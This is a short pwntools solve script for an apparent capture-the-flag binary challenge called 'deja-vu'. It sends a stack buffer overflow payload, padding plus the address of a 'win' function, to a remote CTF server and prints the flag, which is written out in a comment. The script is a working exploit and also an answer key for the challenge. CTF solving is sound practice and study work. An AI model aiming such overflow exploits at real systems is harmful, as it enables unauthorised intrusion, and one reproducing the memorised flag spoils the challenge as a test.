#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./deja-vu", checksec=False)
context.binary = elf
#context.terminal = ["tmux", "splitw", "-h"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("20.84.72.194", 5000)

payload = b""
payload += b"A" * 0x48
payload += p64(elf.sym["win"]+5)

p.sendline(payload)

p.readuntil(b"squ1rrel{")
print("squ1rrel{" + p.readuntil(b"}").decode()) # squ1rrel{w3v3_b33n_h3r3_b3f0r3_n0w_0nt0_b1gger_4nd_better}
